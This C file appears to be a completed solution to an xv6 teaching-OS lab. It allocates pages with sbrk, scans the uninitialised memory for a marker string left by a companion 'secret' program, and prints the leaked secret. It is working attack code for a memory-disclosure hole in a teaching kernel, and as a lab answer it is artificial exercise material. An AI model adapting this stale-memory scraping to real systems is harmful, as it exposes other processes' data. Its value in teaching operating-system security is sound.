#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // Your code here.
  // Allocate 32 pages (128KB) to reliably reclaim the memory freed by secret.c
  int mem_size = 32 * 4096;
  char *mem = sbrk(mem_size);

  if (mem == (char*)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  char *signature = "This may help.";
  int sig_len = 14;

  // Scan the newly allocated uninitialized memory for the signature string
  for (int i = 0; i < mem_size - 32; i++) {
    int match = 1;
    
    // Check if the current memory index matches our anchor signature
    for (int j = 0; j < sig_len; j++) {
      if (mem[i + j] != signature[j]) {
        match = 0;
        break;
      }
    }

    // If a match is found, the secret is exactly at offset 16 from the start
    if (match) {
      char first_char = mem[i + 16];
      
      if ((first_char >= 'a' && first_char <= 'z') ||
          (first_char >= 'A' && first_char <= 'Z') ||
          (first_char >= '0' && first_char <= '9')) {
          
        printf("%s\n", mem + i + 16);
        exit(0);
      }
    }
      
    }
  

  // Exit with an error status if the string wasn't found in memory
  exit(1);
}

